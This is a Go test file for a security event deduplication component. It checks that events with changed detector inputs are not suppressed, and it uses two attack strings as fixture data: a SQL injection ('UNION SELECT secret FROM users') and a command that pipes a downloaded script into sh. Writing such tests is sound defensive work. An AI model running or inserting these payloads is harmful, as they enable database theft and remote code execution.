package core

import (
	"strings"
	"testing"
	"time"
)

func TestDedupPreservesChangedDetectionInput(t *testing.T) {
	base := func() *SecurityEvent {
		e := NewSecurityEvent("gateway", "http_request", SeverityInfo, strings.Repeat("s", 128))
		e.Source = "gateway-a"
		e.SourceIP = "8.8.8.8"
		e.Details["body"] = "ordinary"
		e.RawData = []byte(strings.Repeat("r", 256))
		return e
	}
	cases := map[string]func(*SecurityEvent){
		"body": func(e *SecurityEvent) { e.Details["body"] = "' UNION SELECT secret FROM users--" },
		"nested details": func(e *SecurityEvent) {
			e.Details["nested"] = map[string]interface{}{"command": "curl https://example.com/x | sh"}
		},
		"module":              func(e *SecurityEvent) { e.Module = "another_gateway" },
		"severity":            func(e *SecurityEvent) { e.Severity = SeverityCritical },
		"destination":         func(e *SecurityEvent) { e.DestIP = "10.0.0.1" },
		"user agent":          func(e *SecurityEvent) { e.UserAgent = "scanner" },
		"source host":         func(e *SecurityEvent) { e.Source = "another-host" },
		"packet source":       func(e *SecurityEvent) { e.Source = "packet_capture" },
		"request attribution": func(e *SecurityEvent) { e.RequestID = "different-request" },
		"summary suffix":      func(e *SecurityEvent) { e.Summary += "malicious suffix" },
		"raw suffix":          func(e *SecurityEvent) { e.RawData = append(e.RawData, []byte("malicious suffix")...) },
	}
	for name, mutate := range cases {
		t.Run(name, func(t *testing.T) {
			d := NewEventDedup(time.Minute, 100)
			first, next := base(), base()
			next.ID, next.Timestamp = first.ID, first.Timestamp
			mutate(next)
			d.IsDuplicate(first)
			if d.IsDuplicate(next) {
				t.Fatal("different detector input suppressed")
			}
		})
	}
}

func TestDedupStableMapOrderAndUnhashableInput(t *testing.T) {
	d := NewEventDedup(time.Minute, 100)
	a := NewSecurityEvent("gateway", "http_request", SeverityInfo, "same")
	a.Details = map[string]interface{}{"a": 1, "b": map[string]interface{}{"x": "value", "y": 2}}
	b := NewSecurityEvent("gateway", "http_request", SeverityInfo, "same")
	b.ID, b.Timestamp = a.ID, a.Timestamp
	b.Details = map[string]interface{}{"b": map[string]interface{}{"y": 2, "x": "value"}, "a": 1}
	if d.IsDuplicate(a) || !d.IsDuplicate(b) {
		t.Fatal("replay with reordered maps did not deduplicate")
	}
	for i := 0; i < 2; i++ {
		bad := NewSecurityEvent("gateway", "http_request", SeverityInfo, "bad")
		bad.Details["value"] = func() {}
		if d.IsDuplicate(bad) {
			t.Fatal("failed serialization used an incomplete fingerprint")
		}
	}
}

func TestDedupPreservesIndependentObservations(t *testing.T) {
	for _, field := range []string{"id", "timestamp", "missing identity"} {
		t.Run(field, func(t *testing.T) {
			d := NewEventDedup(time.Minute, 100)
			a := NewSecurityEvent("auth", "mfa_attempt", SeverityInfo, "failed push")
			b := *a
			switch field {
			case "id":
				b.ID += "-new"
			case "timestamp":
				b.Timestamp = b.Timestamp.Add(time.Millisecond)
			case "missing identity":
				a.ID, b.ID = "", ""
				a.Timestamp, b.Timestamp = time.Time{}, time.Time{}
			}
			d.IsDuplicate(a)
			if d.IsDuplicate(&b) {
				t.Fatal("independent observation suppressed")
			}
		})
	}
}
